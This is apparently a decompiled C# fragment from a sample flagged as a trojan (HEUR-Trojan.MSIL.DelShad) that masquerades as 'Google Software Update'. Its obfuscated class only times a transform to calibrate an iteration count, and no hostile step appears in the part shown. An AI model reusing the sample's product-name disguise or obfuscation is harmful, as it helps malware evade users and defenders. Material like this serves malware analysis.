// Decompiled with JetBrains decompiler
// Type: C3904355907.C2852464175
// Assembly: Google Software Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1ECCB2B4-E3D0-48EA-84ED-06938D43796B
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-b37761715d5a2405a3fa75abccaf6bb15b7298673aaad91a158725be3c518a87.exe

using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace C3904355907
{
  public abstract class C2852464175
  {
    [SpecialName]
    public abstract C3554254475.C3865851505 C3554254475();

    [SpecialName]
    public abstract string C3904355907();

    public virtual C1255198513.C1304234792 C1255198513() => new C1255198513.C1304234792(this.C3554254475());

    public virtual void C3554254475([In] C1255198513.C1304234792 obj0)
    {
      Debug.Assert(obj0 != null);
      Debug.Assert(obj0.C3554254475().Equals(this.C3554254475()));
    }

    public abstract byte[] C3554254475([In] byte[] obj0, [In] C1255198513.C1304234792 obj1);

    public virtual C1255198513.C1304234792 C3554254475([In] uint obj0) => throw new NotImplementedException();

    protected void C3554254475(
      [In] C1255198513.C1304234792 obj0,
      [In] string obj1,
      [In] ulong obj2,
      [In] ulong obj3,
      [In] uint obj4,
      [In] bool obj5)
    {
      if (obj0 == null)
        Debug.Assert(false);
      else if (string.IsNullOrEmpty(obj1))
        Debug.Assert(false);
      else if (obj2 > obj3)
      {
        Debug.Assert(false);
      }
      else
      {
        if (obj3 > (ulong) long.MaxValue)
        {
          Debug.Assert(false);
          obj3 = (ulong) long.MaxValue;
          if (obj2 > obj3)
          {
            obj0.C3904355907(obj1, obj2);
            return;
          }
        }
        byte[] numArray = new byte[32];
        for (int index = 0; index < numArray.Length; ++index)
          numArray[index] = (byte) index;
        ulong num1 = obj2;
        ulong num2 = obj2 + 1UL;
        long num3 = 0;
        long num4 = 0;
        long num5 = (long) obj4;
        for (; num2 <= obj3; num2 <<= 1)
        {
          obj0.C3904355907(obj1, num2);
          Stopwatch stopwatch = Stopwatch.StartNew();
          this.C3554254475(numArray, obj0);
          stopwatch.Stop();
          num4 = stopwatch.ElapsedMilliseconds;
          if (num4 <= num5)
          {
            num1 = num2;
            num3 = num4;
          }
          else
            break;
        }
        if (num2 > obj3)
        {
          num2 = obj3;
          num4 = 0L;
        }
        if (num1 > num2)
          num1 = num2;
        while (num2 - num1 >= 2UL)
        {
          ulong num6 = num2 + num1 >> 1;
          if (obj5 && num3 > 0L && num4 > num5 && num3 <= num5)
          {
            ulong val1 = num1 + (ulong) (((long) num2 - (long) num1) * (num5 - num3)) / (ulong) (num4 - num3);
            if (val1 >= num1 && val1 <= num2)
            {
              num6 = Math.Min(Math.Max(val1, num1 + 1UL), num2 - 1UL);
            }
            else
            {
              Debug.Assert(false);
              num6 = num2 + num1 >> 1;
            }
          }
          obj0.C3904355907(obj1, num6);
          Stopwatch stopwatch = Stopwatch.StartNew();
          this.C3554254475(numArray, obj0);
          stopwatch.Stop();
          long elapsedMilliseconds = stopwatch.ElapsedMilliseconds;
          if (elapsedMilliseconds == num5)
          {
            num1 = num6;
            break;
          }
          if (elapsedMilliseconds > num5)
          {
            num2 = num6;
            num4 = elapsedMilliseconds;
          }
          else
          {
            num1 = num6;
            num3 = elapsedMilliseconds;
          }
        }
        obj0.C3904355907(obj1, num1);
      }
    }
  }
}
